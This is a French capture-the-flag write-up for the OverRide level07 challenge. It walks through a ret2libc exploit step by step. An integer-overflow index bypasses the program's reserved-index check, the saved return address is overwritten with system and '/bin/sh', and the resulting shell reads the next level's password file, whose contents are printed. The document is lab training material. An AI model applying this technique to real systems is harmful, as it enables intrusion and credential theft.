### level07

Dans cet exercice, le programme a un système de stockage d'int dans un buffer.
Il prend des commandes en instructions et des nombres accompagnés d'index pour les stocker.
Le programme efface les arguments du main ainsi que les variables d'environnement.
Nous allons donc nous tourner vers un ret2libc.

Pour cela, nous devons commencer par trouver l'eip et le modifier.

On cherche l'adresse du buffer data pour calculer par la suite l'index du tableau qui correspond à eip.
On sait qu'il est envoyé en paramètre à store_number, c'est là que l'on va le chercher :

```bash
level07@OverRide:~$ gdb -q level07 
Reading symbols from /home/users/level07/level07...(no debugging symbols found)...done.
(gdb) b store_number 
Breakpoint 1 at 0x8048636
(gdb) r
Starting program: /home/users/level07/level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store

Breakpoint 1, 0x08048636 in store_number ()
(gdb) x $ebp+0x8
0xffffd520:	0xffffd544
```

L'adresse du premier élément du tableau est : 0xffffd544

Maintenant, on cherche l'adresse d'eip :

```bash
level07@OverRide:~$ gdb -q level07 
Reading symbols from /home/users/level07/level07...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048729
(gdb) r
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048729 in main ()
(gdb) i f
Stack level 0, frame at 0xffffd710:
 eip = 0x8048729 in main; saved eip 0xf7e45513
 Arglist at 0xffffd708, args: 
 Locals at 0xffffd708, Previous frame's sp is 0xffffd710
 Saved registers:
  ebp at 0xffffd708, eip at 0xffffd70c
```

On trouve eip = 0xffffd70c

L'index d'eip dans le tableau data est donc : 0xffffd70c - 0xffffd544 = 456 / 4 = 114

Malheureusement, 114 est un multiple de 3 et on ne peut pas utiliser directement ces derniers en index :

```C
    if (!(index % 3) || number >> 0x18 != 0xb7) {
        puts(" *** ERROR! ***");
        puts("   This index is reserved for wil!");
        puts(" *** ERROR! ***");
        return 1;
    }
```

Or lors du stockage du nombre, le programme effectue : ``data[index << 2] = number;``
Cela signifie que comme dans l'exercice bonus1 de rainfall, on peut chercher un nombre qui va overflow et donner 114.
Pour cela, on reprend le même script et en lui donnant 456 on obtient : `1073741938`

Démonstration :

```bash
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 24
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
Input command: store
 Number: 42
 Index: 1073741938
 Completed store command successfully
Input command: read
 Index: 114
 Number at data[114] is 42
 Completed read command successfully
```

Cela nous donne l'index à utiliser pour rediriger le flux d'exécution du programme.
Maintenant, comme dans l'exercice 4, on va chercher l'adresse de system et celle de la string "/bin/sh" :

```bash
level07@OverRide:~$ gdb -q level07 
Reading symbols from /home/users/level07/level07...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048729
(gdb) r
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048729 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) i proc map
process 2188
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
	 0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
	 0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fda000 0xf7fdb000     0x1000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

system : 0xf7e6aed0 = 4159090384
/bin/sh : 0xf7f897ec = 4160264172

On va utiliser leurs valeurs en décimal pour les entrer dans data.
On store d'abord system en 114 avec l'index 1073741938 puis 2 entrées plus loin on stocke /bin/sh et enfin on quit :

```bash
store
4159090384
1073741938
store
4160264172
116
quit
```

On les copie dans un fichier dans tmp qu'on exécute comme suit :

```bash
level07@OverRide:~$ cat /tmp/commands - | ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
